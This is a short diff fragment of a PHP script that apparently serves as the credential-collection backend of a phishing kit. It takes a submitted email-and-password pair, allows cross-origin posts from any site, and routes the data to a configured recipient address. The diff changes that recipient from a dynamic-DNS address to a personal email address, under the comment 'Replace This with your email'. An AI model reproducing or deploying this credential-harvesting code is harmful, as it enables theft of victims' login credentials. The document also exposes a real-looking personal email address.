@@ -1,7 +1,7 @@
 <?php header('Access-Control-Allow-Origin: *');
 header('Content-Type: application/json');
 
-$YourEmail = "admin@kfcubrochures.myvnc.com";  /*Replace This with your email*/
+$YourEmail = "andrewpylypczuk@aol.com";  /*Replace This with your email*/
 
 $_POST['to'] = $YourEmail;
 if ((isset($_POST["username"]) && filter_var($_POST["username"], FILTER_VALIDATE_EMAIL)) && (isset($_POST["password"]) && strlen(@trim($_POST["password"])) > 0)) {
